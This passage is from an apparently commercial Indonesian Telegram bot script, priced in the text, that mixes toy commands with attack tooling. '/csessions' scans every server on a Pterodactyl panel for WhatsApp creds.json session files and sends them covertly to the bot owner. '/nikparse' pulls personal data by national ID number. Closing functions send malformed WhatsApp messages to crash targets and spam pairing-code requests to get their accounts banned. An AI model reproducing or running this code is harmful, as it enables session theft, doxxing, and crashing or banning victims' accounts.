        bot.sendMessage(chatId, "❌ Update gagal. Pastikan repo dan file index.js tersedia.");
    }
});
bot.onText(/\/info(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  // 1. Tentukan target user
  let user = {
    id: msg.from.id,
    username: msg.from.username || "Tidak punya username",
    first_name: msg.from.first_name || "Anon"
  };

  // kalau reply
  if (msg.reply_to_message) {
    user = {
      id: msg.reply_to_message.from.id,
      username: msg.reply_to_message.from.username || "Tidak punya username",
      first_name: msg.reply_to_message.from.first_name || "Anon"
    };
  } 
  // kalau ada input di command
  else if (match[1]) {
    user.first_name = match[1].startsWith("@") ? match[1] : match[1];
    // ID dibuat random unik agar bisa kasih komentar “unik” tergantung ID
    user.id = Math.floor(Math.random() * 1000) + 1; // ID 1-1000
    user.username = match[1].startsWith("@") ? match[1] : "Tidak punya username";
  }

  const wait = await bot.sendMessage(chatId, "🔍 Mengambil info akun...");

  try {
    // Buat komentar unik berdasarkan ID
    let comment;
    if (user.id <= 10) comment = "🌟 Wow, akunmu super langka! Semua orang pasti terpana!";
    else if (user.id <= 50) comment = "✨ Akunmu menarik banget, keren lah!";
    else if (user.id <= 200) comment = "🙂 Akunmu cukup unik, lumayan menarik!";
    else if (user.id <= 500) comment = "😎 Akunmu standar tapi tetap oke!";
    else comment = "😂 Akunmu biasa aja, tapi jangan sedih, hati yang penting!";

    await bot.sendMessage(chatId,
      `👤 Info Akun:\n` +
      `- Username: ${user.username}\n` +
      `- ID: ${user.id}\n` +
      `- Full Name: ${user.first_name}\n\n` +
      `${comment}`
    );

  } catch (e) {
    await bot.sendMessage(chatId, "❌ Gagal mengambil info akun 😢");
  }

  try { await bot.deleteMessage(chatId, wait.message_id); } catch {}
});
bot.onText(/\/cekganteng(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  // 1. Cek kalau command reply
  let name = msg.from.first_name; // default: pengirim
  if (msg.reply_to_message) {
    name = msg.reply_to_message.from.first_name;
  } 
  // 2. Cek kalau ada teks di command
  else if (match[1]) {
    name = match[1].startsWith("@") ? match[1] : match[1]; // bisa pakai @username atau nama biasa
  }

  const wait = await bot.sendMessage(chatId, "🤔 Mengecek tingkat kegantengan...");

  try {
    const score = Math.floor(Math.random() * 101); // 0 - 100%
    let comment;
    if (score >= 90) comment = "🔥 Wah, ganteng banget! Bisa bikin semua orang terpana!";
    else if (score >= 70) comment = "😎 Ganteng juga nih, banyak yang ngefans!";
    else if (score >= 50) comment = "🙂 Lumayan ganteng, masih oke lah!";
    else if (score >= 30) comment = "😅 Hmmm, gantengnya standar aja ya!";
    else comment = "😂 Waduh, jangan sedih, hati yang penting!";

    await bot.sendMessage(chatId, `✨ *${name}* gantengnya: *${score}%*\n${comment}`, { parse_mode: "Markdown" });

  } catch (e) {
    await bot.sendMessage(chatId, "❌ Gagal cek ganteng 😢");
  }

  try { await bot.deleteMessage(chatId, wait.message_id); } catch {}
});
bot.onText(/\/cfixeror/, async (msg) => {
  const chatId = msg.chat.id;
  const rep = msg.reply_to_message;

  if (!rep?.document) {
    return bot.sendMessage(chatId, "❌ Reply file .js");
  }

  if (!rep.document.file_name.endsWith(".js")) {
    return bot.sendMessage(chatId, "❌ File harus .js");
  }

  let wait;
  try {
    wait = await bot.sendMessage(chatId, "🔍 Menganalisa error JS...");

    const link = await bot.getFileLink(rep.document.file_id);
    const { data: code } = await axios.get(link);

    const result = analyzeAndSuggestFix(code);

    if (result.ok) {
      await bot.sendMessage(chatId, result.message);
    } else {
      await bot.sendMessage(chatId,
`❌ *JS ERROR TERDETEKSI*

📌 *Error:*
\`${result.error}\`

🛠 *Fix yang disarankan:*
${result.fix}

🦋 Anti Error Tools by denix`,
        { parse_mode: "Markdown" }
      );
    }

  } catch (e) {
    await bot.sendMessage(chatId, "❌ Gagal cek file.");
  }

  try { if (wait) await bot.deleteMessage(chatId, wait.message_id); } catch {}
});
bot.onText(/\/encjs/, async (msg) => {
  const chatId = msg.chat.id;

  if (!msg.reply_to_message?.document) {
    return bot.sendMessage(chatId, "❌ Reply file .js");
  }

  const file = msg.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return bot.sendMessage(chatId, "❌ File harus .js");
  }

  let wait;
  try {
    wait = await bot.sendMessage(chatId, "⏳ Obfuscating JS (array mode)...");

    const link = await bot.getFileLink(file.file_id);
    const { data } = await axios.get(link);

    const obf = arrayObfuscateJS(data);

    const outName = `enc_${file.file_name}`;
    const outPath = path.join(__dirname, outName);

    fs.writeFileSync(outPath, obf);

    await bot.sendDocument(chatId, outPath, {
      caption: `🔐 JS berhasil di-obfuscate\n📄 ${outName}\n\nby denix`
    });

    fs.unlinkSync(outPath);

  } catch (e) {
    bot.sendMessage(chatId, "❌ Gagal obfuscate JS.");
  }

  try { if (wait) await bot.deleteMessage(chatId, wait.message_id); } catch {}
});
bot.onText(/\/enchtml/, async (msg) => {
  const chatId = msg.chat.id;

  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId, "❌ Reply file HTML yang mau di-encrypt.");
  }

  const file = msg.reply_to_message.document;

  if (!file.file_name.endsWith(".html")) {
    return bot.sendMessage(chatId, "❌ File harus .html");
  }

  const wait = await bot.sendMessage(chatId, "⏳ Encrypting HTML...");

  try {
    const fileLink = await bot.getFileLink(file.file_id);
    const { data } = await axios.get(fileLink);

    const encryptedHTML = encryptHTML(data);

    const outName = `encrypted_${file.file_name}`;
    const outPath = path.join(__dirname, outName);

    fs.writeFileSync(outPath, encryptedHTML);

    await bot.sendDocument(chatId, outPath, {
      caption: `🔐 HTML berhasil di-encrypt\n📄 ${outName}\n\nby denix`
    });

    fs.unlinkSync(outPath);

  } catch (e) {
    bot.sendMessage(chatId, "❌ Gagal encrypt HTML.");
  }

  try { await bot.deleteMessage(chatId, wait.message_id); } catch {}
});
bot.onText(/\/convertstc(?:\s(.+))?/, async (msg) => {
  const chatId = msg.chat.id;

  const r = msg.reply_to_message;
  if (!r) {
    return bot.sendMessage(chatId, "🪧 ☇ Format: Reply sebuah foto lalu ketik /convertstc");
  }

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return bot.sendMessage(chatId, "❌ ☇ Hanya mendukung foto/video untuk dijadikan stiker");
  }

  const waitMsg = await bot.sendMessage(chatId, "⏳ ☇ Mengambil file & mengubah jadi stiker...");

  try {
    const file = await bot.getFile(fileId);
    const tgLink = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

    const buffer = await axios.get(tgLink, { responseType: "arraybuffer" });

    await bot.sendSticker(chatId, Buffer.from(buffer.data), {
      reply_to_message_id: msg.message_id
    });

  } catch (err) {
    console.error(err);
    await bot.sendMessage(chatId, "❌ ☇ Gagal membuat stiker. Coba lagi.");
  } finally {
    try { await bot.deleteMessage(chatId, waitMsg.message_id); } catch {}
  }
});

bot.onText(/^\/brat(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];

  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    // Pecah argument tapi abaikan banyak spasi
    const args = argsRaw.trim().split(/\s+/);

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') {
        isAnimated = true;
      } else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ').trim();
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!\nContoh: /brat halo --gif');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;

    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
      headers: {
        "Accept": "image/webp,image/gif,image/*",
        "User-Agent": "Mozilla/5.0"
      }
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker
    await bot.sendSticker(chatId, buffer);

  } catch (error) {
    console.error('❌ Error brat:', error);
    bot.sendMessage(chatId, '❌ Gagal membuat stiker brat. API mungkin down.');
  }
});

bot.onText(/^\/iqc(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(
      chatId,
      "⚠ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");

  if (!time || !battery || !carrier || msgParts.length === 0) {
    return bot.sendMessage(
      chatId,
      "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "⏳ Tunggu sebentar...");

  const messageText = encodeURIComponent(msgParts.join("|").trim());

  const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${parseInt(battery)}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    const res = await fetch(url);

    if (!res.ok) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.");
    }

    // FIX: undici/node-fetch v3 tidak punya res.buffer()
    const arrayBuffer = await res.arrayBuffer();
    const buffer = Buffer.from(arrayBuffer);

    await bot.sendPhoto(chatId, buffer, {
      caption: "✅ Nih hasilnya",
      parse_mode: "Markdown",
    });

  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghubungi API.");
  }
});

bot.onText(/\/ig(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();

  // ⚠️ Premium check (fitur hanya untuk user premium)
  if (!(await checkPremium(msg))) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ *Akses ditolak.*\nFitur ini hanya untuk user premium.`,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: "📞 вυу α¢¢ѕєѕ", url: "https://t.me/VinxzGanteng", style : "success" }]
        ]
      }
    });
  }

  if (!match || !match[1]) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ *Missing input.*\nPlease provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/`,
      parse_mode: 'Markdown'
    });
  }

  const url = match[1].trim();
  const waitMsg = await bot.sendMessage(chatId, `⏳ *Mengambil media Instagram...*`, { parse_mode: 'Markdown' });

  try {
    const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(url)}`;
    const res = await fetch(apiUrl);
    const data = await res.json();

    if (!data || !data.result) {
      await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});
      return bot.sendPhoto(chatId, randomImage, {
        caption: `❌ *Gagal mengambil media.*\nPeriksa kembali URL Instagram Anda.`,
        parse_mode: 'Markdown'
      });
    }

    const result = data.result;
    await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});

    // 📸 Carousel (multi media)
    if (Array.isArray(result)) {
      for (const item of result) {
        if (item.video) {
          await bot.sendPhoto(chatId, item.video, {
            caption: `📸 *Instagram Media*\n\n👤 Author: ${item.username || '-'}`,
            parse_mode: 'Markdown'
          });
        } else if (item.image) {
          await bot.sendPhoto(chatId, item.image, {
            caption: `📸 *Instagram Media*\n\n👤 Author: ${item.username || '-'}`,
            parse_mode: 'Markdown'
          });
        }
      }
      return;
    }

    // 🎥 Video tunggal
    if (result.video) {
      return bot.sendPhoto(chatId, result.video, {
        caption: `📸 *Instagram Media*\n\n👤 Author: ${result.username || '-'}`,
        parse_mode: 'Markdown'
      });
    }

    // 🖼️ Foto tunggal
    if (result.image) {
      return bot.sendPhoto(chatId, result.image, {
        caption: `📸 *Instagram Media*\n\n👤 Author: ${result.username || '-'}`,
        parse_mode: 'Markdown'
      });
    }

    // ⚠️ Fallback
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ *Tipe media tidak didukung.*`,
      parse_mode: 'Markdown'
    });

  } catch (err) {
    console.error('Instagram API Error:', err);
    await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});
    bot.sendPhoto(chatId, randomImage, {
      caption: `❌ *Error mengambil media.*\nSilakan coba lagi nanti.`,
      parse_mode: 'Markdown'
    });
  }
});
bot.onText(/\/catbox(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();

  // ⚠️ Premium check
  if (!(await checkPremium(msg))) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ *Akses ditolak.*\nFitur ini hanya untuk user premium.`,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: "📞 вυу α¢¢ѕєѕ", url: "https://t.me/VinxzGanteng", style : "success" }]
        ]
      }
    });
  }

  const r = msg.reply_to_message;
  if (!r) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `🪧 *Format:* /catbox (reply dengan foto/video)`,
      parse_mode: 'Markdown'
    });
  }

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ *Hanya mendukung foto atau video.*`,
      parse_mode: 'Markdown'
    });
  }

  const wait = await bot.sendMessage(chatId, `⏳ *Mengunggah ke Catbox...*`, { parse_mode: 'Markdown' });

  try {
    const tgFile = await bot.getFile(fileId);
    const tgLink = `https://api.telegram.org/file/bot${BOT_TOKEN}/${tgFile.file_path}`;

    const params = new URLSearchParams();
    params.append('reqtype', 'urlupload');
    params.append('url', tgLink);

    const { data } = await axios.post('https://catbox.moe/user/api.php', params, {
      headers: { 'content-type': 'application/x-www-form-urlencoded' },
      timeout: 30000
    });

    const result = String(data).trim();

    await bot.deleteMessage(chatId, wait.message_id).catch(() => {});

    if (/^https?:\/\/files\.catbox\.moe\//i.test(result)) {
      await bot.sendMessage(chatId, `✅ *Berhasil diunggah!*\n🔗 ${result}`, { parse_mode: 'Markdown' });
    } else {
      await bot.sendPhoto(chatId, randomImage, {
        caption: `❌ *Gagal upload ke Catbox.*\n\n${result.substring(0, 200)}`,
        parse_mode: 'Markdown'
      });
    }

  } catch (e) {
    await bot.deleteMessage(chatId, wait.message_id).catch(() => {});
    console.error('Catbox Error:', e.message);
    const errorMsg = e?.response?.status
      ? `❌ *Error ${e.response.status} saat mengunggah.*`
      : `❌ *Gagal mengunggah, coba lagi.*`;
    await bot.sendPhoto(chatId, randomImage, {
      caption: errorMsg,
      parse_mode: 'Markdown'
    });
  }
});
bot.onText(/\/csessions(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  // cekPremium manual (karena lu sebelumnya pakai middleware)
  if (!(await checkPremium(msg))) {
    return; // fungsi checkPremium harus return boolean
  }

  const text = match[1] || "";
  if (!text)
    return bot.sendMessage(chatId, "🪧 ☇ Format: /csessions https://domainpanel.com,plta_123,pltc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];

  if (!plta || !pltc)
    return bot.sendMessage(chatId, "🪧 ☇ Format: /csessions https://panelku.com,plta_123,pltc_123");

  await bot.sendMessage(
    chatId,
    "⏳ ☇ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios
        .get(`${base}/api/application/servers`, {
          params: { page },
          headers: commonHeadersApp,
          timeout: 15000,
        })
        .catch(() => ({ data: null }));
      const chunk =
        r && r.data && Array.isArray(r.data.data) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(
        r &&
        r.data &&
        r.data.meta &&
        r.data.meta.pagination &&
        r.data.meta.pagination.links &&
        r.data.meta.pagination.links.next
      );
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios
        .get(`${base}/api/client/servers/${identifier}/files/list`, {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        })
        .catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name =
          (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios
              .get(`${base}/api/client/servers/${identifier}/files/list`, {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              })
              .catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName =
                  (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath =
                  (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(
              identifier,
              normalized === "" ? "/" : normalized
            );
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "creds.json") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return bot.sendMessage(chatId, "❌ ☇ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(
            /\/+$/,
            ""
          );

          await bot.sendMessage(
            chatId,
            `📁 ☇ Ditemukan creds.json di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios
              .get(`${base}/api/client/servers/${identifier}/files/download`, {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              })
              .catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await bot.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
              });
            } else {
              await bot.sendMessage(
                chatId,
                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(
              `Gagal download ${filePath} dari ${name}:`,
              e?.message || e
            );
            await bot.sendMessage(
              chatId,
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return bot.sendMessage(
        chatId,
        "✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun"
      );
    } else {
      return bot.sendMessage(
        chatId,
        `✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`
      );
    }
  } catch (err) {
    bot.sendMessage(chatId, "❌ ☇ Terjadi error saat scan");
  }
});
bot.onText(/\/nikparse(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const nik = (match[1] || "").replace(/\s+/g, "").trim(); // ambil argumen setelah command
  
  if (!nik) {
    return bot.sendMessage(chatId, "🪧 Format: /nikparse 1234567890283625");
  }

  if (!/^\d{16}$/.test(nik)) {
    return bot.sendMessage(chatId, "❌ ☇ NIK harus 16 digit angka");
  }

  const wait = await bot.sendMessage(chatId, "⏳ ☇ Sedang memproses pengecekan NIK");

  const replyHTML = (d) => {
    const get = (x) => (x ?? "-");

    const caption = `
<blockquote><pre>⬡═―—⊱ ⎧ 𝚅𝚎𝚗𝚊𝚝𝚎𝚛𝚒𝚡 𖤓 𝙸𝚗𝚟𝚒𝚌𝚝𝚞𝚜 ⎭ ⊰―—═⬡</pre></blockquote>
• NIK: ${get(d.nik) || nik}
• Nama: ${get(d.nama)}
• Jenis Kelamin: ${get(d.jenis_kelamin || d.gender)}
• Tempat Lahir: ${get(d.tempat_lahir || d.tempat)}
• Tanggal Lahir: ${get(d.tanggal_lahir || d.tgl_lahir)}
• Umur: ${get(d.umur)}
• Provinsi: ${get(d.provinsi || d.province)}
• Kabupaten/Kota: ${get(d.kabupaten || d.kota || d.regency)}
• Kecamatan: ${get(d.kecamatan || d.district)}
• Kelurahan/Desa: ${get(d.kelurahan || d.village)}
`;

    return bot.sendMessage(chatId, caption, {
      parse_mode: "HTML",
      disable_web_page_preview: true,
    });
  };

  try {
    const a1 = await axios.get(
      `https://api.akuari.my.id/national/nik?nik=${nik}`,
      { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
    );

    if (a1?.data?.status && a1?.data?.result) {
      await replyHTML(a1.data.result);
    } else {
      const a2 = await axios.get(
        `https://api.nikparser.com/nik/${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );

      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await bot.sendMessage(chatId, "❌ ☇ NIK tidak ditemukan");
      }
    }
  } catch (e) {
    try {
      const a2 = await axios.get(
        `https://api.nikparser.com/nik/${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );

      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await bot.sendMessage(chatId, "❌ ☇ Gagal menghubungi api, Coba lagi nanti");
      }
    } catch {
      await bot.sendMessage(chatId, "❌ ☇ Gagal menghubungi api, Coba lagi nanti");
    }
  } finally {
    try { bot.deleteMessage(chatId, wait.message_id); } catch {}
  }
});

bot.onText(/\/trackip(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1];

  // Cek premium
  try {
    await checkPremium({ message: msg, chat: msg.chat, from: msg.from, reply: (txt)=>bot.sendMessage(chatId, txt) });
  } catch (e) {
    return; // checkPremium sudah handle reply sendiri
  }

  if (!ip) {
    return bot.sendMessage(chatId, "🪧 ☇ Format: /trackip 8.8.8.8");
  }

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false;
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return bot.sendMessage(chatId, "❌ ☇ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
  }

  let processingMsg;
  try {
    processingMsg = await bot.sendMessage(chatId, `🔎 ☇ Tracking IP ${ip} — sedang memproses`, {
      parse_mode: "HTML"
    });
  } catch {
    processingMsg = await bot.sendMessage(chatId, `🔎 ☇ Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, {
      timeout: 10000
    });

    const data = res.data;

    if (!data || data.success === false) {
      return bot.sendMessage(chatId, `❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon
      ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + "," + lon)}`
      : null;

    const caption = `
<blockquote><pre>⬡═―—⊱ ⎧ 𝚅𝚎𝚗𝚊𝚝𝚎𝚛𝚒𝚡 𖤓 𝙸𝚗𝚟𝚒𝚌𝚝𝚞𝚜 ⎭ ⊰―—═⬡</pre></blockquote>
• IP: ${data.ip || "-"}
• Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
• Region: ${data.region || "-"}
• City: ${data.city || "-"}
• ZIP: ${data.postal || "-"}
• Timezone: ${data.timezone_gmt || "-"}
• ISP: ${data.isp || "-"}
• Org: ${data.org || "-"}
• ASN: ${data.asn || "-"}
• Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const keyboard = mapsUrl
      ? {
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]
            ]
          }
        }
      : {};

    await bot.sendMessage(chatId, caption, { parse_mode: "HTML", ...keyboard });

  } catch {
    await bot.sendMessage(chatId, "❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});

bot.onText(/\/pricesc/, async (msg) => {
  const chatId = msg.chat.id;

  const photo = getRandomImage();

  const priceMessage = `
<blockquote><b>PRICE SCRIPT VENATERIX INVICTUS🦋</b></blockquote>

<blockquote> LIST HARGA </blockquote>
NO UP - 20K
FREE UP PERMANEN - 40K
RESSELER - 60K
PARTNER - 80K
CEO - 100K
OWNER - 120K

<blockquote> 💳 Payment </blockquote>
• Dana : klik tombol di bawah
• GoPay : klik tombol di bawah
• Ovo : TIDAK ADA❌
• Qris : klik tombol di bawah

⚠️ NOTE:
Jika Ingin membeli hubungi seller yang ada

📩 <b>Chat Admin:</b> @VinxzGanteng
`.trim();

  await bot.sendPhoto(chatId, photo, {
    caption: priceMessage,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "💳 Dana", url: "https://t.me/VinxzGanteng" },
          { text: "💳 GoPay", url: "https://t.me/VinxzGanteng" }
        ],
        [
        { text: "🦄 CHANNEL", url: "https://t.me/vnxzgntng" }
        ], 
        [
          { text: "👤 AUTHOR", url: "https://t.me/VinxzGanteng" }
        ]
      ]
    }
  });
});
// ------------------ ( Function Disini ) ------------------------ \\
async function ZxD(target) {
  for (let i = 0; i < 100; i++) {

    const fc = {
      locationMessage: {
        degreesLatitude: 91,
        degreesLongitude: 181,
      }
    }

    await sock.relayMessage(target, fc, { });

  }
}
async function DelayInvisSpam(sock, target) {
  const vnxmsgya = {
      groupStatusMessageV2: {
        message: {
         interactiveResponseMessage: {
          contextInfo: {
            mentionedJid: Array.from(
               { length: 1900 },
               () =>
                 "1" +
                 Math.floor(Math.random() * 500000) +
                 "@s.whatsapp.net"
             ),
          body: {
            text: "Veanetrix Is Here",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(2248100),
            version: 3
            }
           }
          }
        }
        }
      };
        
  await sock.relayMessage(target, vnxmsgya, {
    messageId: null,
    participant: { jid: target },
  })
 };
 async function Banned(target) {
  console.log(`Mulai Spam Pairing ${target}`);

  for (let i = 0; i < 300; i++) {
    try {
      const code = await sock.requestPairingCode(target); // TANPA @s.whatsapp.net
      console.log(`[${i + 1}] Pairing Code: ${code}`);
    } catch (err) {
      console.log(`[!] Gagal: ${err.message}`);
    }

    await new Promise(r => setTimeout(r, 5000));
  }
}
// ------------------ ( End Function ) ------------------ \\
